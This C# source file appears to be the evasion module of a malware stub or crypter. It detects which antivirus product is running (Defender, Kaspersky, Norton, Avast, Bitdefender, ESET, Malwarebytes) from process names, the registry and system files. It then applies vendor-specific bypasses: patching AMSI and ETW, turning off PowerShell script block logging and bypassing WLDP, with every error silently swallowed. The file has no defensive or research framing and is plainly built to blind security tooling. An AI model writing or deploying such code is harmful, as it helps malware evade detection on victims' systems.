using System;
using System.Diagnostics;
using System.IO;
using Microsoft.Win32;
using NRE.Core.Evasion;

namespace NRE.Stub.Evasion
{
    /// <summary>
    /// Detects AV vendor and applies a vendor-specific set of bypasses (used when --specific is set).
    /// </summary>
    public static class AvSpecificBypass
    {
        public static void Apply()
        {
            try
            {
                string vendor = DetectVendor();
                if (string.IsNullOrEmpty(vendor)) return;

                switch (vendor.ToUpperInvariant())
                {
                    case "DEFENDER":
                        try { AmsiPatch.Patch(useHardwareBreakpoint: false); } catch { }
                        try { EtwPatch.Patch(); } catch { }
                        try { ScriptBlockLogBypass.Disable(); } catch { }
                        break;
                    case "KASPERSKY":
                        try { AmsiPatch.Patch(useHardwareBreakpoint: true); } catch { }
                        try { EtwPatch.Patch(); } catch { }
                        try { WldpBypass.Patch(); } catch { }
                        break;
                    case "NORTON":
                    case "SYMANTEC":
                        try { AmsiPatch.Patch(useHardwareBreakpoint: false); } catch { }
                        try { EtwPatch.Patch(); } catch { }
                        break;
                    case "AVAST":
                    case "AVG":
                        try { AmsiPatch.Patch(useHardwareBreakpoint: false); } catch { }
                        try { EtwPatch.Patch(); } catch { }
                        try { WldpBypass.Patch(); } catch { }
                        break;
                    case "BITDEFENDER":
                        try { AmsiPatch.Patch(useHardwareBreakpoint: true); } catch { }
                        try { EtwPatch.Patch(); } catch { }
                        break;
                    case "ESET":
                        try { AmsiPatch.Patch(useHardwareBreakpoint: false); } catch { }
                        try { EtwPatch.Patch(); } catch { }
                        break;
                    case "MALWAREBYTES":
                        try { AmsiPatch.Patch(useHardwareBreakpoint: false); } catch { }
                        try { EtwPatch.Patch(); } catch { }
                        break;
                    default:
                        try { AmsiPatch.Patch(useHardwareBreakpoint: false); } catch { }
                        try { EtwPatch.Patch(); } catch { }
                        break;
                }
            }
            catch { }
        }

        private static string DetectVendor()
        {
            try
            {
                foreach (var p in Process.GetProcesses())
                {
                    try
                    {
                        string name = (p.ProcessName ?? "").ToUpperInvariant();
                        if (name.Contains("MSMPENG") || name.Contains("DEFENDER") || name.Contains("SECURITYHEALTH"))
                            return "Defender";
                        if (name.Contains("NIS") || name.Contains("NORTON") || name.Contains("CCSVCHST"))
                            return "Norton";
                        if (name.Contains("AVP") || name.Contains("KASPERSKY") || name.Contains("KLAVA"))
                            return "Kaspersky";
                        if (name.Contains("AVAST") || name.Contains("AVGSVC") || name.Contains("AVG"))
                            return name.Contains("AVG") ? "AVG" : "Avast";
                        if (name.Contains("BD") || name.Contains("BITDEFENDER") || name.Contains("VSSERV"))
                            return "Bitdefender";
                        if (name.Contains("ESET") || name.Contains("EKRN") || name.Contains("EGUI"))
                            return "ESET";
                        if (name.Contains("MALWAREBYTES") || name.Contains("MBAM"))
                            return "Malwarebytes";
                    }
                    catch { }
                    finally { p.Dispose(); }
                }
            }
            catch { }

            try
            {
                using (var key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows Defender", false))
                {
                    if (key != null)
                    {
                        var disable = key.GetValue("DisableAntiSpyware");
                        if (disable == null || (int)disable == 0)
                            return "Defender";
                    }
                }
            }
            catch { }

            try
            {
                string sys = Environment.SystemDirectory ?? "";
                if (File.Exists(Path.Combine(sys, "MsMpEng.exe")))
                    return "Defender";
            }
            catch { }

            return null;
        }
    }
}
